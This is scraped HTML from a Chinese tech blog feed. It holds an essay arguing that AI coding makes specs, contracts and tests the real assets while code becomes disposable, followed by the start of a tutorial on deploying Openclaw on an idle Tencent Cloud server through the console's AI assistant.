table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>AI 编码时代的一些实践与观察</p>
</blockquote>
<p>前两天我做了一件"轻浮"的事：把 1000 行刚“写"完的代码删了。</p>
<p>原因单纯觉得代码不顺手、逻辑绕、读起来累。以前这种情况下，我一般会硬着头皮去重构。但这次我直接 <code>git restore</code> 了，然后对着 AI 让它 “重头再来”。</p>
<p>最让我自己印象深刻的，不是 AI 又写出了一份"能跑"的实现，而是我删掉代码那一瞬间的心理状态：<strong>我没有任何负罪感与舍不得。</strong></p>
<p>仔细想想这事儿在以前很不可思议。我们过去几十年都把"源代码"当成公司资产、团队心血、个人作品。现在呢？<strong>代码不重要了，丢了不心疼。</strong></p>
<p>那问题来了：<strong>如果代码不值钱了，写代码的人还值钱吗？</strong></p>
<hr/>
<h2 data-id="heading-0">1、Programming ≠ Coding</h2>
<p>图灵奖得主 Leslie Lamport 有一个演讲，题目就叫 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DuyLy7Fu4FB4" target="_blank" title="https://www.youtube.com/watch?v=uyLy7Fu4FB4" ref="nofollow noopener noreferrer">"Programming ≠ Coding"</a></strong>。</p>
<p>他讲得很直接：<strong>很多人以为自己在 Programming，其实只是 Coding</strong>。Programming 是思考问题本质、设计算法和抽象；Coding 是用具体语言把它实现出来。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07d15c6d0e4e4431ab7ac4a42eaeb4d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731248&amp;x-signature=kccR8eWUhIb4d1EqcxWXc3l23FU%3D" alt="file" loading="lazy"/></p>
<p>如果把这个观点再往上推一层，可以得到一个三层模型：</p>
<pre><code class="hljs language-markdown" lang="markdown">Engineering
  |  定义目标、边界、约束（What / Why）
  v
Programming
  |  抽象、协议、Spec、状态机（How @ 抽象层）
  v
Coding
<span class="hljs-code">     具体实现（How @ 实现层）
</span></code></pre>
<p>过去和现在，这三层的"主战场"已经不一样了：</p>

























<table><thead><tr><th/><th>过去</th><th>AI 时代</th></tr></thead><tbody><tr><td><strong>主要瓶颈</strong></td><td>实现贵、出错率高</td><td>定义不清、边界模糊</td></tr><tr><td><strong>人的精力焦点</strong></td><td>Coding：怎么写对、写快、少 bug</td><td>Programming/Engineering：怎么定义清楚</td></tr><tr><td><strong>Coding 的角色</strong></td><td>主战场</td><td>执行层（类似编译器）</td></tr></tbody></table>
<p>Lamport 还有一句话很不错：</p>
<blockquote>
<p>"You don't produce ten times less code by better coding. You do it with a cleaner architecture — a better abstraction."
（你不可能通过更好的编码把代码量减少到十分之一；你只能通过更清晰的架构（更好的抽象）做到这一点）</p>
</blockquote>
<p>当 AI 把 Coding 的边际成本打下来之后，一个很自然的问题就浮出来了：<strong>那 Programming 层和 Engineering 层呢？我们应该用什么去定义它们？</strong></p>
<p>这时候，一些"死去的记忆"突然攻击了我。</p>
<h2 data-id="heading-1">2、契约先行：代码正在变成"可蒸发物"</h2>
<p>"死去的记忆"开始攻击我。一些过去在软件工程书籍里被提过、但在业务高速增长年代里常常被忽略的概念，重新复苏了。</p>
<p>比如 <strong>Design by Contract（契约式设计）</strong>——1986 年，Bertrand Meyer 在设计 Eiffel 语言时提出这个理念。它强调：软件组件之间的协作关系，应当通过<strong>可验证的接口 Spec</strong>表达出来，典型形式包括：</p>
<ul>
<li><strong>Precondition（前置条件）</strong>：调用方必须满足的条件</li>
<li><strong>Postcondition（后置条件）</strong>：被调用方在完成后必须保证的条件</li>
<li><strong>Invariant（不变量）</strong>：对象/模块在生命周期中需要长期维持的约束</li>
</ul>
<p>用更短的一句话概括就是：<strong>契约先行——先把边界写清楚，再谈实现。</strong></p>
<p>这一思路甚至可以延伸到系统级设计：上节提到的 Leslie Lamport，它提出的 TLA+，就是用数学化的 Spec 描述分布式、并发等复杂场景的全局契约，提前验证 “数据一致性”“并发死锁” 这类组件级契约难以覆盖的系统级逻辑漏洞，和 DbC 本质都是 “先锁规则，再做实现”。</p>
<p>为什么类似的东西多年前没有成为"默认实践"？可能是因为现实约束：实现成本高、交付压力大、组织扩张快。你让大家先写 Spec、先做形式化建模——这在短期看起来是"额外投入"。</p>
<p>Fred Brooks 在 <em>No Silver Bullet</em>（1986）里区分过两类复杂性：</p>
<ul>
<li><strong>Accidental Complexity（偶然复杂性）</strong>：语法、样板代码、环境配置、重复劳动——主要由工具和流程造成</li>
<li><strong>Essential Complexity（本质复杂性）</strong>：需求澄清、抽象设计、系统边界、一致性语义——来自问题域本身</li>
</ul>
<p>AI 来了之后，这个账要重新算：</p>






























<table><thead><tr><th/><th>过去</th><th>AI 时代</th></tr></thead><tbody><tr><td><strong>偶然复杂性</strong></td><td>消耗大量工程精力</td><td>AI 大幅压缩（写接口、补样板、修 lint）</td></tr><tr><td><strong>本质复杂性</strong></td><td>同样存在，但常被"赶进度"掩盖</td><td>仍然存在，甚至更容易被 AI 的"完整实现"掩盖</td></tr><tr><td><strong>核心资产</strong></td><td>代码本身</td><td>契约层（类型 / 接口 / 测试 / Spec）</td></tr><tr><td><strong>代码的性质</strong></td><td>资产、心血、不轻易删</td><td>可蒸发物、可重建的缓存</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58f5ebdf78fd4dfd9e1a16e52207e9a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731248&amp;x-signature=cwqcwJNqU%2BE04njBdR4Y0mtAy9w%3D" alt="file" loading="lazy"/></p>
<p>回到前几天我删代码的操作——我能那么果断，靠的其实不是勇气，是底气。底气来自一层"契约"已经写在那里：</p>
<ul>
<li>类型：输入输出的结构约束</li>
<li>接口：模块暴露什么能力、怎么调用</li>
<li>测试：哪些行为必须成立，边界在哪里</li>
</ul>
<p>只要这层东西在，代码就没那么神圣了。写得不好？实在不行调整完“契约”，代码删掉重来。某个实现绕了？换一种写法。甚至整个模块都能替换掉——前提是<strong>契约可靠</strong>。</p>
<p>所以我有一个稍微激进但很实用的心智模型：</p>
<blockquote>
<p><strong>Spec（广义契约）与测试更接近"源"，实现更像一种可重建的缓存。</strong></p>
</blockquote>
<p>我不是说实现不重要，而是说：在契约足够清晰、验证足够自动化的前提下，<strong>实现的可替换性会显著提高</strong>。</p>
<h2 data-id="heading-2">3、技术栈会"分层沉淀"</h2>
<p>那么，未来的技术栈会如何分层呢？</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[表层]</span> 业务变化快 / 迭代快
       代码可替换性强，AI 写得最多。大家基本都在这一层工作。

<span class="hljs-selector-attr">[中层]</span> 通用能力沉淀：组件库 / 框架 / 中间件
       变化变慢，开始强调稳定性与兼容性。出现一些未来被叫做“底层"的新基架人。

<span class="hljs-selector-attr">[基岩]</span> runtime / 编译器 / OS / 协议栈
       变动极少，但一动就可能是系统级影响。很多公司可能都没一个这样的人。
</code></pre>
<p>这其实就是历史在重演：</p>






























<table><thead><tr><th>时代</th><th>"主流”开发者在写什么</th><th>"底层"交给谁了</th></tr></thead><tbody><tr><td>1960s</td><td>汇编</td><td>硬件工程师</td></tr><tr><td>1990s</td><td>C/C++</td><td>汇编 / OS 专家</td></tr><tr><td>2010s</td><td>高级语言 / 框架</td><td>系统程序员</td></tr><tr><td>2030s?</td><td>Spec / 契约 / 架构设计</td><td>AI + 少数代码专家</td></tr></tbody></table>
<p>今天写业务的人不懂汇编，也不需要懂；但我们仍然需要懂汇编/懂 runtime 的人 —— 不多，但不能没有。</p>
<p>那么，当下是那些不懂代码的人，成为了 Spec / 契约 / 架构设计师么？</p>
<p>也许不是。我观察到一个有点"残酷"的现象：<strong>那些能上升到 AI x Spec Engineer 的人，往往是本身 Coding 能力就很强的人。</strong></p>
<p>他们不是因为"看不起、看不懂代码"而上去的，而是因为他们真的把代码玩懂了 —— 写得够多、踩过够多坑、读过够多源码，才敢在上层随心所欲。</p>
<p>也就是说，借助 AI 编码，越会写代码的人，越不需要写代码了。这就引出一个困境：</p>
<h2 data-id="heading-3">4、成长路径断裂：不写代码，能懂代码吗？</h2>
<p>Ruby on Rails 的作者 DHH 写过一篇文章<a href="https://link.juejin.cn?target=https%3A%2F%2Fworld.hey.com%2Fdhh%2Fcoding-should-be-a-vibe-50908f49" target="_blank" title="https://world.hey.com/dhh/coding-should-be-a-vibe-50908f49" ref="nofollow noopener noreferrer">《Coding should be a vibe!》</a>，他说 AI 是很好的结对伙伴，但把键盘完全交出去，他宁可退休。他的理由很简单：写代码本身就是乐趣，是手艺。未来手动编码或许会变成类似 “养马代步” 的小众爱好，失去经济价值 ——编程应该以人为本，迎合开发者的需求，带来愉悦的体验。</p>
<p>但他同时还提出了一个更尖锐的问题：</p>
<blockquote>
<p>"If you don't actually write code, how do you learn to code?"</p>
<p>如果你不去真实地写代码，你如何学会 Coding？（来自 DHH 的另一期<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D6i5hvNA72ZU" target="_blank" title="https://www.youtube.com/watch?v=6i5hvNA72ZU" ref="nofollow noopener noreferrer">播客访谈</a>）</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5dc12164c1341c58779c8bd9e832c62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731248&amp;x-signature=5SPbUkHeytbq6ymuMsLxQqiyPDs%3D" alt="file" loading="lazy"/></p>
<p>他打了一个弹吉他的比方：你看再多的吉他视频，只要你没有亲手去学习，你就很难学会弹吉他。放在我们今天的语境里，这个问题可以再推一步：</p>
<blockquote>
<p>要成为顶尖的 Spec Engineer，需要深刻理解代码。</p>
<p>但如果 Coding 被 AI 接管了，这种理解从哪里来？</p>
</blockquote>
<p>这就是我说的"成长路径断裂"：过去我们靠"写得多 → 踩坑多 → 理解深"来积累能力。现在第一步被 AI 替掉了，中间会不会断层？</p>
<p>面对这个困难，在其他事情上也许能找到一些参考：</p>
<ul>
<li><strong>飞行员不是每天都手动飞</strong>，但他们定期用模拟器保持手感、训练极端情况。代码会不会变成类似的"模拟器"——不是日常生产工具，而是用来建立直觉、训练诊断能力的训练工具？</li>
<li><strong>指挥家不需要精通每种乐器</strong>，但他懂乐理、懂配器、听过足够多、也指挥过足够多。未来的 Spec Engineer，也许不需要"能手写一切"，但需要"能听懂代码在说什么、能诊断哪里出了问题"。</li>
<li><strong>医生的住院实习期仍然存在</strong>，即使手术机器人越来越强。也许我们仍然需要一段"强制手写代码"的阶段，作为建立底层理解的必经之路。</li>
</ul>
<p>"懂代码"的定义可能会变：从"我能把它写出来"，变成"我能审查它、能评判它、能在关键时刻诊断它"。</p>
<p>这只是一些推测，现在没有答案。甚至"没有答案"本身就是答案的一部分：我们正在经历一次职业路径的巨大变化。</p>
<h2 data-id="heading-4">5、那现在应该学什么？</h2>
<p>最近面试的时候，有候选人问：<strong>现在应该学什么？</strong></p>
<p>他们的困惑很真实：过去花时间掌握的很多编码知识，AI 现在都会了；而且在日常工作里，大家也确实越来越依赖 AI 来写代码。那接下来往哪走？</p>
<p>同样这也是我们很多人的困惑。如果要尝试回答，可能是：</p>
<h3 data-id="heading-5">第一，重新学习软件工程和架构设计。</h3>
<p>这听起来像句废话，但认真想想：过去十几年互联网高速增长的时候，大家的注意力大多在"怎么更快写出来"上。软件工程那些东西——抽象建模、系统边界、契约设计——在课上听过，在工作里落实得不多。</p>
<p>现在 AI 把 Coding 成本打下来了，这些"上层能力"反而变得更值钱。重新把它们捡起来，不是复古，是顺势而为。比如现在大家热议的 SDD（Spec-Driven Development）、TDD（Test-Driven Development）、PBT（Property-Based Testing）——这些概念都不是 AI 时代新创的，最早的可以追溯到二三十年前。只是现在 AI 让"先写 Spec/测试，让机器填实现"这件事变得真正可行，它们才重新翻红。</p>
<h3 data-id="heading-6">第二，把 Vibe Coding/Vibe Engineering 当成一门实践课来学。</h3>
<p>Vibe Coding 上手太简单，让大家会误以为它并没有技巧。其实不然。OpenAI 创始成员、特斯拉前 AI 总监 Andrej Karpathy <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fkarpathy%2Fstatus%2F2004607146781278521" target="_blank" title="https://x.com/karpathy/status/2004607146781278521" ref="nofollow noopener noreferrer">发推</a>说自己"作为程序员从未感到如此落后"，他觉得如果能把过去一年出现的东西串起来，生产力可以提升 10 倍，但没做到就是技能问题。Steve Yegge 在<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fk147AyWj01W-V7IpkV0g2A" target="_blank" title="https://mp.weixin.qq.com/s/k147AyWj01W-V7IpkV0g2A" ref="nofollow noopener noreferrer">近期访谈</a>里更激进：他认为驾驭 AI 编程需要约 2000 小时的刻意练习。</p>
<p>不管你叫它 Vibe Coding、Vibe Engineering 还是别的什么，它本质上是一种<strong>新的协作模式</strong>——需要主动学习和刻意练习，不是天然就会的（前一篇文章也有提到：<a href="https://link.juejin.cn?target=https%3A%2F%2Fkstack.corp.kuaishou.com%2Farticle%2F14474" target="_blank" title="https://kstack.corp.kuaishou.com/article/14474" ref="nofollow noopener noreferrer">《Vibe Coding 中的 5 个选择》</a>）。</p>
<p>那对于我们这些接触不深的开发者，可以如何循序渐进呢？</p>
<ol>
<li><strong>尝试用"计划模式"入门 SDD</strong>——很多 AI 编码工具都有类似的能力，根据你的需求先生成计划文档（spec），等你确认后再生成实现。这是最低成本的入门方式。慢慢找到用文档和 Spec 驱动开发的感觉</li>
<li><strong>解锁并行工作的能力</strong>——同时让多个 Agent 帮你一起干活。大家可以在很多工具里找个这个能力。</li>
<li><strong>发现适合自己的工作模式</strong>——每个人的习惯不一样，有人喜欢先写测试，有人喜欢先画架构图，有人喜欢对话式迭代。找到你自己的节奏，逐步去挑战更复杂的任务。</li>
<li><strong>打造自己的工作流</strong>——借助 Skills、Rules、MCP 等，打造自己的高效工作模式。</li>
</ol>
<h3 data-id="heading-7">第三，多花点时间关注自己的业务。</h3>
<p>不要光死盯着代码了，理解业务，理解目标，理解整个事情为什么要这么做。拒绝成为 AI 人柱力。</p>
<h2 data-id="heading-8">6、一个开放问题</h2>
<p>最后留一个问题给大家，可以尽情在评论区大战：</p>
<blockquote>
<p><strong>会不会出现"代码盲"的优秀架构师？</strong>—— 从未亲手写过代码，但能设计出色的系统</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2dd8afd93254c11a252ed20a0104c61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770731248&amp;x-signature=wqJbjYvu1LaUvsq7h6f2VGJWJJY%3D" alt="file" loading="lazy"/></p>
<p>无论答案是什么，<strong>当实现成本下降时，能够把事情"想清楚、写清楚、验证清楚"的能力，会变得更稀缺</strong>。</p>
<p>回到开头的问题：<strong>如果代码不值钱了，写代码的人还值钱吗？</strong></p>
<p>我的回答是：<strong>写代码的人不会消失，但能"定义清楚要写什么"的人会更值钱。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[把废弃的腾讯云服务器改为 Openclaw 仅需一句话！！！（附带免费白嫖AI模型）]]></title>    <link>https://juejin.cn/post/7602466689712078863</link>    <guid>https://juejin.cn/post/7602466689712078863</guid>    <pubDate>2026-02-03T13:28:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689712078863" data-draft-id="7602246300454092835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="把废弃的腾讯云服务器改为 Openclaw 仅需一句话！！！（附带免费白嫖AI模型）"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T13:28:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LucianaiB"/> <meta itemprop="url" content="https://juejin.cn/user/1269294586664749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            把废弃的腾讯云服务器改为 Openclaw 仅需一句话！！！（附带免费白嫖AI模型）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1269294586664749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LucianaiB
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:28:07.000Z" title="Tue Feb 03 2026 13:28:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是热爱探索AI前沿技术的LucianaiB。</p>
<p>前面我尝试了，感兴趣的可以才是部署一下试试</p>
<p>1.在 Windows 上部署 Openclaw：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FiF3ED1e649kkmdR26Y1xiw" target="_blank" title="https://mp.weixin.qq.com/s/iF3ED1e649kkmdR26Y1xiw" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/iF3ED1e64…</a></p>
<p>2.把 Openclaw 接入到 Moltbook：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQUrB50iwRGGdkl1LO-Tl8Q" target="_blank" title="https://mp.weixin.qq.com/s/QUrB50iwRGGdkl1LO-Tl8Q" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/QUrB50iwR…</a></p>
<p>相信很多技术爱好者都有这样的经历：趁着双十一或者大促，脑子一热买了一台腾讯云或者阿里云的服务器。买的时候雄心勃勃，想着要搭建博客、跑脚本、做图床。结果呢？大概率是跑了几个自动化签到脚本后，它就静静地躺在控制台里“吃灰”，每个月白白扣费。</p>
<p>但是在自己的电脑运行 Openclaw 无法做到24小时的在运行，于是我就想到了我有一个好久不用的腾讯云服务器，之前购买主要是跑一些自动化签到脚本，并没有实际做什么具体工作。于是我就想到把废弃的腾讯云服务器改为 Openclaw 的24小时的服务器。</p>
<p>于是，一个大胆的想法诞生了：<strong>能不能把我那个闲置的腾讯**</strong>云服务器*<strong>*，改造成一个 24 小时在线的 Openclaw？</strong></p>
<p>今天，我就手把手教大家，如何用一句话，把服务器秒改 Openclaw。</p>
<h2 data-id="heading-0">一句话让腾讯云服务器改为 Openclaw</h2>
<p>首先打开你的服务器管理网站</p>
<p>👉 <strong>直达链接</strong>：：<a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.cloud.tencent.com%2Flighthouse%2Finstance%2F" target="_blank" title="https://console.cloud.tencent.com/lighthouse/instance/" ref="nofollow noopener noreferrer">console.cloud.tencent.com/lighthouse/…</a></p>
<p>（如果没有服务器的可以通过左侧的 Openclaw 专属链接获取有更大优惠：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.tencentcloud.com%2Fact%2Fpro%2FFreeTier%3Freferral_code%3DU0R814D3%26lang%3Den" target="_blank" title="https://www.tencentcloud.com/act/pro/FreeTier?referral_code=U0R814D3&amp;lang=en" ref="nofollow noopener noreferrer">www.tencentcloud.com/act/pro/Fre…</a>）</p>
<p>注：我用的是国内腾讯云服务器，而专属链接获得的是腾讯云国际服务器，网络连接 OpenAI 或 GitHub 会更顺畅。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bd3f5da6dee4a5c83b9a0fcc2ac1420~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=kCIOi%2FDWATc7sRbNpdytYQEcers%3D" alt="img" loading="lazy"/></p>
<p>选择你要部署的服务器直接登录即可，登录后如下所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f8d78bbd7b04d79a77d968918a39519~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=fSWJPyGLwuMUeYqALTP2%2B3jyzy4%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-1">真正的「0 门槛」启动</h3>
<p>你不需要懂代码！！！</p>
<p>直接在右上角点击<code>OrcaTerm AI</code>，唤醒AI助手。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d7c47d80183431183b1501224b5f142~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=inwf%2Bap%2BL7w%2FR4EwVIbTdepgZ%2B4%3D" alt="img" loading="lazy"/></p>
<p>只要在 AI 助手中用提示词表达即可，例如：<strong>“部署OpenClaw🔥”</strong></p>
